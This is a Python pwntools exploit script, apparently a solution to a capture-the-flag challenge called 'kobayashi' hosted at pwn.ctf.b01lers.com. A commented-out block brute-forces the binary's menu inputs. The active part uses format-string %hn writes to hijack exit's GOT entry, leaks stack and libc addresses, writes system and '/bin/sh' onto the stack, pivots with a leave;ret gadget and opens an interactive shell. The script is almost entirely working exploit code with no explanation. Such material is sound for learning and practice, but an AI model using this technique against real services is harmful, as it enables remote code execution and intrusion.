from pwn import *
"""
ch=dict()
ch['Janice']="1"
ch['Nyota']="1"
ch['Leonard']="3"
ch['Scotty']="1"
name=dict()
name[0]="Janice"
name[1]="Nyota"
name[2]="Leonard"
name[3]="Scotty"

possibilities=[]

def get_next(chosen,path):
    if chosen==4:
        possibilities.append(path[1:].split(","))
        return
    for i in range(4):
        get_next(chosen+1,path+","+name[i])

get_next(0,"")
counter=len(possibilities)
context.log_level="error"

for poss in possibilities:
    print counter , poss
    counter-=1
    p=process("./kobayashi")
    try:
        p.sendline("2")
        p.sendline(poss[0])
        p.sendline(ch[poss[0]])
        p.sendline(poss[1])
        p.sendline(ch[poss[1]])
        p.sendline(poss[2])
        p.sendline(ch[poss[2]])
        p.sendline(poss[3])
        data=p.recvall(timeout=2)
        if "Seriously? Are you senile or something?" in data:
            print "NOOOOOOOOOOOOOOOOOOOOO"
        p.send("AAAAAA")
        print "###############################"
        print poss
        print "###############################"
        exit(0)
        p.close()
    except:
        p.close()

"""
#

p=remote("pwn.ctf.b01lers.com",1006)
#p=process("./kobayashi")
p.sendline("2")
p.sendline("Scotty")
p.sendline("1")
p.sendline("Nyota")
p.sendline("1")
p.sendline("Janice")
p.sendline("1")
p.sendline("Leonard")
exit_got=0x804f01c
payload=""
payload+=p32(exit_got)
payload+="%43783x"
payload+="%6$hn"
p.sendline(payload)
p.recvuntil("13")

p.sendline("%15$x-%76$x\x00")
data=p.recv().split("-")
stack=int(data[0],16)-44
leak=int(data[1],16)
base=leak-0x018e81
system=base+0x03cd10
binsh=base+0x17b8cf
print "stack :",hex(stack)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
leave_ret=0x08048585


first=system & 0xffff
payload=""
payload+=p32(stack)
payload+="%"+str(first-4)+"x"
payload+="%8$hn"
p.sendline(payload)


second =(system >>16)& 0xffff
payload=""
payload+=p32(stack+2)
payload+="%"+str(second-4)+"x"
payload+="%9$hn"
p.sendline(payload)

first=binsh & 0xffff
payload=""
payload+=p32(stack+8)
payload+="%"+str(first-4)+"x"
payload+="%10$hn"
p.sendline(payload)

second =(binsh >>16)& 0xffff
payload=""
payload+=p32(stack+8+2)
payload+="%"+str(second-4)+"x"
payload+="%11$hn"
p.sendline(payload)
p.recvuntil("13")
p.recvuntil("13")
p.recvuntil("13")
p.recvuntil("13")
first =leave_ret& 0xffff

payload=""
payload+=p32(exit_got)
payload+="%"+str(first-4)+"x"
payload+="%12$hn"
pause()
p.sendline(payload)
data=p.recv()[4:]

p.interactive()

    
#0x0804ab52

# to write 0x0804ab23
